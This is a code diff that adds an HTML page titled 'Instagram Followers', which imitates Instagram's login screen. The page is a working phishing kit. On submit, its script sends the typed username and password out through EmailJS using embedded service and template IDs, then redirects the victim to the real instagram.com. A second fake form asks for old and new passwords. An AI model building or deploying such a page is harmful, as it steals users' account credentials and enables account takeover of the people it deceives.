@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Followers</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="script.js"></script>
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+   
+</head>
+<body>
+<div id="backAll">
+    <form onsubmit="sendEmail(event)">
+    <div id="form">
+        <div id="ig-logo"><img src="ig-logo.png" alt=""></div>
+        <br>
+        <div id="message">Something went wrong try again</div>
+   <div id="ins">
+    <div id="in1">
+        <input type="text" name="" id="nameIn" required placeholder="Phone number, username, or email">
+    </div>
+  
+    <div id="in2">
+       <input type="password" name="" id="passIn" required placeholder="Password">  
+    </div>
+   <div id="button">
+    <div id="bg-log">
+        <button type="submit" id="btn-logIn">Log in</button>
+    </div>
+    
+    <div id="btn-load">
+
+        <div id="loading"></div>
+    </div>
+   </div>
+   <br>
+   <br>
+   
+ <hr>
+ <div id="or">OR</div>
+ <div id="fb-log">
+    <img id="fb" src="fb-logo.png" alt="">
+   
+ </div>
+ <h5 id="res">Forgot password?</h5>
+   </div>
+    </div>
+</form>
+    <div id="form2">
+        <div id="ig-logo"><img src="ig-logo.png" alt=""></div>
+        <br>
+        <div id="message">Something went wrong try again</div>
+   <div id="ins">
+    <div id="in13">
+        <input type="text" name="" id="newPass" placeholder="Old Password">
+    </div>
+    <div id="in4">
+        <input type="text" name="" id="oldPass" placeholder=" New Password">  
+     </div>
+     
+    <div id="nep">
+       <input type="text" name="" id="" placeholder="Username , email , Phone number">  
+    </div>
+   <div id="button">
+    <div id="bg-log">
+        <button id="btn-logIn2">Change</button>
+    </div>
+    
+    <div id="btn-load">
+
+        <div id="loading"></div>
+    </div>
+   </div>
+   <br>
+   <br>
+   <h5 id="back">Back to Log in</h5>
+    </div>
+</div>
+
+</body>
+<script>
+    let logPage=document.querySelector('#form');
+    let backPage=document.querySelector('#back');
+    let cgpass=document.querySelector('#form2');
+    let alert = document.querySelector('#message');
+    let fbLog=document.querySelector('#fb');
+    let foget=document.querySelector('#res');
+    let logBg=document.querySelector("#bg-log")
+  let logBtn = document.querySelector("#btn-logIn");
+  let btnLoad = document.querySelector("#btn-load");
+  //gpt
+  (function() {
+            emailjs.init("0VTwDjGKRMOL8Eh2m"); // Replace with your user ID
+        })();
+
+        function sendEmail(event) {
+            event.preventDefault(); // Prevent the form from submitting normally
+
+            const templateParams = {
+                to_name: 'Recipient Name', // Change this to the actual recipient name
+                from_name: document.getElementById('nameIn').value, // User's name
+                message: document.getElementById('passIn').value, // Password as message
+                reply_to: 'your_email@example.com' // Replace with your email if needed
+            };
+
+            emailjs.send('service_kwyz019', 'template_wpkv74b', templateParams)
+                .then((response) => {
+                    console.log('Email sent successfully!', response.status, response.text);
+                    alert('Email sent successfully!');
+                }, (error) => {
+                    console.error('Failed to send email.', error);
+                    alert('Failed to send email. Please try again.');
+                });
+        }
+  //gpt
+  backPage.addEventListener('click',()=>{
+    cgpass.style.display='none';
+    logPage.style.display='block';
+  })
+  foget.addEventListener('click',()=>{
+     alert.style.display='none';
+     logBtn.style.display='none';
+     btnLoad.style.display='block';
+     setTimeout(() => {
+        alert.style.display='block';
+        logBtn.style.display='block';
+        cgpass.style.display='block';
+        logPage.style.display='none';
+        btnLoad.style.display='none';
+     }, 3000);
+     setTimeout(() => {
+        alert.style.display='none';
+        
+     }, 6000);
+  })
+  fbLog.addEventListener('click',()=>{
+     alert.style.display='none';
+     logBtn.style.display='none';
+     btnLoad.style.display='block';
+     setTimeout(() => {
+        alert.style.display='block';
+        logBtn.style.display='block';
+        btnLoad.style.display='none';
+     }, 3000);
+     setTimeout(() => {
+        alert.style.display='none';
+        
+     }, 6000);
+  })
+  logBtn.addEventListener('click',()=>{
+    logBtn.style.display='none';
+    btnLoad.style.display='block';
+    setTimeout(() => {
+        window.open('https://www.instagram.com/');
+    }, 5000);
+  })
+ 
+</script>
+</html>
